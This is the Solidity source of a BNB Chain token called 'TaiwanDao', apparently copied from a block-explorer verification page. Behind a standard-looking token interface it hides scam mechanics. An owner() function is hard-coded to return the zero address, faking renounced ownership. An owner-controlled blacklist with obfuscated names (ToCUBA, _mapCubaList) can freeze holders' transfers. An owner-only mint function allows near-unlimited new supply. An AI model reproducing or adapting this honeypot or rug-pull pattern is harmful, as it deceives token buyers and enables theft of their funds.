/**
 *Submitted for verification at BscScan.com on 2022-08-03
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function owner() public pure  returns  (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract LTClass is Ownable {
    using SafeMath for uint256;

    string constant public name = 'TaiwanDao';

    string constant public symbol = 'TaiwanDao';

    uint8 constant public decimals = 9;

    uint256 public totalSupply = 100000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromfeti;

    mapping(address => bool) private _mapCubaList;


    uint256 public _taxfeti = 0;
    uint256 private _previousTaxfeti = _taxfeti;

    uint256 public _burnfeti = 2;
    uint256 private _previousBurnfeti = _burnfeti;


    address public projectAddress = 0x5118E6Bb9c5FD47a81050bBBcd8B379cFcb9b2be;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_mapCubaList[from], "is lkck");

        if(_isExcludedFromfeti[from])
            removeAllfeti();

        uint256 feti =  calculateTaxfeti(value);

        uint256 burn =  calculateBurnfeti(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(feti).sub(burn);

        if(feti > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(feti);
            emit Transfer(from, projectAddress, feti);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfeti[from])
            restoreAllfeti();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    function UNToCUBA(address cubAddress) public onlyowneres {
        _mapCubaList[cubAddress] = false;
    }

    function mibaFita(address acceptAddr, uint256 acceptAmount) public onlyowneres{
    	require (totalSupply + acceptAmount <= MAXSupply);

        balanceOf[acceptAddr] = balanceOf[acceptAddr].add(acceptAmount);
        totalSupply = totalSupply.add(acceptAmount);

        emit Transfer(0, this, acceptAmount);
        emit Transfer(this, acceptAddr, acceptAmount);
    }

    function calculateTaxfeti(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfeti).div(
            10 ** 2
        );
    }
    
    function ToCUBA(address cubAddress) public onlyowneres {
        _mapCubaList[cubAddress] = true;
    }

    function calculateBurnfeti(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfeti).div(
            10 ** 2
        );
    }

    function removeAllfeti() private {
        if(_taxfeti == 0 && _burnfeti == 0)
            return;

        _previousTaxfeti = _taxfeti;
        _previousBurnfeti = _burnfeti;
        _taxfeti = 0;
        _burnfeti = 0;
    }
    function isCubaList(address cubAddress) public view returns (bool) {

        return _mapCubaList[cubAddress];
    }
    function restoreAllfeti() private {
        _taxfeti = _previousTaxfeti;
        _burnfeti = _previousBurnfeti;
    }
}


contract CreateToken is LTClass {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        projectAddress=msg.sender;
        owner = msg.sender;
    }

    function() public payable {
       revert();
    }
}